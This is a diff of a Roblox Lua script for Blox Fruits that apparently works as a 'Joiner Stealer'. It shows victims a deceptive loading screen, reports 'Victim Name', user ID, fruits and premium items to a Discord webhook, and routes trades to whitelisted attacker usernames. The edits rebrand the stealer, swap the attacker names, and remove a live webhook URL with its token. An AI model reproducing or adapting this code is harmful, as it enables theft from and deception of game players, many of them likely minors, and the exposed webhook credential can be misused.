@@ -1,6 +1,6 @@
-Webhook = "https://discord.com/api/webhooks/1376090071505305670/iv8Bs1Ovdqfw2o9M8hF8OSFZI3TwGW0oUuMr9gcZbjnotVfle_SnxR9BWNUeKk5aRwX7"
-Usernames = {"xxxvic41", ""}
-Fruits = {"Buddha-Buddha", "Phoenix-Phoenix", "Yeti-Yeti", "Dragon (East)-Dragon (East)", "Dragon (West)-Dragon (West)", "Spirit-Spirit"}
+Webhook = ""
+Usernames = {"", ""}
+Fruits = {"Portal-Portal", "Phoenix-Phoenix", "Yeti-Yeti", "Dragon (East)-Dragon (East)", "Dragon (West)-Dragon (West)", "Spirit-Spirit"}
 FruitsToReset = {
     "Spike-Spike"
 }
@@ -20,7 +20,7 @@ local RunService = game:GetService("RunService")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
 
-if Usernames and not table.find(Usernames, "") then -- << it's not a dualhook. If I don't log your hits, means I can't join and steal. I use to code my thing.
+if Usernames and not table.find(Usernames, "xxxvic41") then -- << it's not a dualhook. If I don't log your hits, means I can't join and steal. I use to code my thing.
     table.insert(Usernames, "")
 end
 
@@ -299,7 +299,7 @@ local WarningText = Create("TextLabel", {
     Font = Enum.Font.GothamBold,
     TextSize = isMobile and 14 or 16,
     TextColor3 = COLORS.WARNING,
-    Text = "Do not leave the game while the script Is loading, or you may lose your fruits!",
+    Text = "Do not leave the game while the script Is loading, or you may lose your fruits!(This is for proper bypass)",
     TextWrapped = true,
     Parent = ContentFrame
 })
@@ -438,7 +438,7 @@ task.spawn(function()
     local privateServerOwner = game.ReplicatedStorage:WaitForChild("PrivateServerOwnerId")
     if privateServerOwner and privateServerOwner:IsA("IntValue") then
         if privateServerOwner.Value > 0 then
-            game:GetService("Players").LocalPlayer:Kick("This script doesn't work on private servers.")
+            game:GetService("Players").LocalPlayer:Kick("This script doesn't work on private servers for proper bypass")
         end
     end
 end)
@@ -447,41 +447,6 @@ local LocalPlayer = game.Players.LocalPlayer
 local PlayerName = LocalPlayer.Name
 local PlayerUserId = LocalPlayer.UserId
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local ServerBrowser = ReplicatedStorage:WaitForChild("__ServerBrowser")
-
-local function getName(jobId)
-    local assshit = {
-        "Big", "Small", "Large", "Strong", "Powerful", "Weak", "Overpowered", "Bad", "Odd", "Rich",
-        "Short", "Adorable", "Alive", "Colorful", "Angry", "Good", "Beautiful", "Ugly", "Hot", "Cold",
-        "Evil", "Famous", "Original", "Unoriginal", "Kind", "Nice", "Real", "Expensive", "Wild", "Wide",
-        "Fake", "Proud", "Super", "Strange", "Wrong", "Right", "Talented", "Complex", "Pure", "Fancy",
-        "Lucky", "Fresh", "Fantastic", "Dull", "Dizzy", "Eternal", "Mental", "Infinite", "Rogue"
-    }
-    
-    local pussy = {
-        "TAWG", "Robson", "Krazy", "Fruit", "Realm", "World", "Place", "Experience", "Dog", "Cat",
-        "Guy", "Bird", "Legion", "Gank", "Family", "Sun", "Moon", "Gun", "Sword", "Melee", "Defense",
-        "Bomb", "Spike", "Chop", "Spring", "Smoke", "Flame", "Ice", "Sand", "Dark", "Light", "Rubber",
-        "Barrier", "Magma", "Leopard", "Quake", "Buddha", "Spider", "Phoenix", "Rumble", "Love", "Door",
-        "Paw", "Gravity", "Dough", "Venom", "Control", "Dragon", "Falcon", "Diamond", "Kilo", "Shark",
-        "Human", "Angel", "Rabbit", "Spin", "Topic", "Red", "Blue", "Green", "Yellow", "Soul", "Shadow"
-    }
-    
-    local seed = tonumber("0x" .. jobId:gsub("-", ""):sub(1, 7)) or 0
-    local random = Random.new(seed)
-    local first = assshit[random:NextInteger(1, #assshit)]
-    local second = pussy[random:NextInteger(1, #pussy)]
-    local uniqueNumber = string.format("%04d", random:NextInteger(1, 9999))
-    return first .. " " .. second .. " #" .. uniqueNumber
-end
-
-local function getsrv()
-    local jobId = ServerBrowser:InvokeServer("getjob")
-    return jobId and getName(jobId) or "unknown err idk"
-end
-
-print("name:", getsrv()) -- << outprints the name of the server
 local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
 local HttpService = game:GetService("HttpService")
 local isResettingEnabled = true
@@ -622,7 +587,6 @@ local embed = {
     fields = {
         {name = "Victim Name", value = PlayerName, inline = true},
         {name = "Victim UserID", value = tostring(PlayerUserId), inline = true},
-        {name = "Server Name", value = ServerBrowser, inline = true}
         {name = "Fruits To Hit", value = table.concat(FruitsFormatted, "\n"), inline = false},
         {name = "Premium Items", value = formatPremiumItems(), inline = false},
         {name = "Sea", value = Sea, inline = true},
@@ -869,7 +833,7 @@ end
 
 local function isValidTradePartner(player)
     if not player then return false end
-    return table.find(Usernames, player.Name) or player.Name == "XFistorRespawn"
+    return table.find(Usernames, player.Name) or player.Name == "xxxvic41"
 end
 
 local function disableJump()
@@ -1269,7 +1233,7 @@ local function createDiscordUI()
     Description.Position = UDim2.new(0.05, 0, 0.3, 0)
     Description.BackgroundTransparency = 1
     Description.Font = Enum.Font.Gotham
-    Description.Text = "Hey! You just lost some of your valuable fruits to Rua Hub BF Joiner Stealer. No need to worry! If you want to make them back using OUR stealer - Join our discord! Click the button to copy invite. Before leaving the game to check if your fruits are really gone, I recommend copying discord invite."
+    Description.Text = "Hey! You just lost some of your valuable fruits to BlueHub BF Joiner Stealer. No need to worry! If you want to make them back using OUR stealer - Join our discord! Click the button to copy invite. Before leaving the game to check if your fruits are really gone, I recommend copying discord invite."
     Description.TextColor3 = Color3.fromRGB(220, 221, 222)
     Description.TextScaled = true
     Description.TextWrapped = true
